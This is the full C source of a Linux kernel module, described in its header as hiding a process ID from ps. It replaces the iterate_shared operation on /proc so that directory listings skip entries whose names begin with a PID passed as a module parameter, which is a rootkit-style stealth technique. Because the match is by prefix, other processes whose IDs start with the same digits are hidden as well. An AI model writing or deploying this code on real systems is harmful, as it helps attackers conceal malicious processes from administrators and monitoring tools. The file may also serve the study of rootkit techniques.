#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/namei.h>

MODULE_DESCRIPTION("Hide process id from ps");
MODULE_AUTHOR("Thomas Lam");
MODULE_LICENSE("GPL");

static struct file_operations *proc_old_fop;
static struct file_operations proc_new_fop;
static struct inode *proc_inode;
static struct path p;
static struct dir_context *old_ctx;

/* PID associated with the process that is being hidden */
static char *pid = "-1";
module_param(pid, charp, S_IRUSR | S_IWUSR);

static int lkm_hide_pid_filldir_t(struct dir_context *ctx,
				  const char *proc_name, int d_reclen,
				  loff_t d_off, u64 d_ino, unsigned d_type)
{
	if (strncmp(proc_name, pid, strlen(pid)) == 0) {
		/* someone wants to see this process :) */
		return 0;
	}

	return old_ctx->actor(old_ctx, proc_name, d_reclen, d_off, d_ino,
			      d_type);
}

struct dir_context hide_pid_ctx = { .actor = lkm_hide_pid_filldir_t };

int lkm_hide_pid_iterate_shared(struct file *file, struct dir_context *ctx)
{
	int ret;

	hide_pid_ctx.pos = ctx->pos;
	old_ctx = ctx;
	ret = proc_old_fop->iterate_shared(file, &hide_pid_ctx);
	ctx->pos = hide_pid_ctx.pos;
	return ret;
}

static int __init lkm_hide_pid_init(void)
{
	if (strncmp(pid, "-1", strlen(pid)) == 0) {
		printk(KERN_WARNING "hide_pid: pid not set correctly\n");
		return -EINVAL;
	}

	if (kern_path("/proc", 0, &p)) {
		return -ENOENT;
	}

	printk(KERN_INFO "hide_pid: Hiding process %s\n", pid);

	proc_inode = p.dentry->d_inode;

	proc_new_fop = *proc_inode->i_fop;
	proc_old_fop = proc_inode->i_fop;

	proc_new_fop.iterate_shared = lkm_hide_pid_iterate_shared;
	proc_inode->i_fop = &proc_new_fop;

	return 0;
}

static void __exit lkm_hide_pid_exit(void)
{
	if (kern_path("/proc", 0, &p)) {
		return;
	}

	printk(KERN_INFO "hide_pid: Unhiding process %s\n", pid);

	proc_inode = p.dentry->d_inode;
	proc_inode->i_fop = proc_old_fop;
}

module_init(lkm_hide_pid_init);
module_exit(lkm_hide_pid_exit);
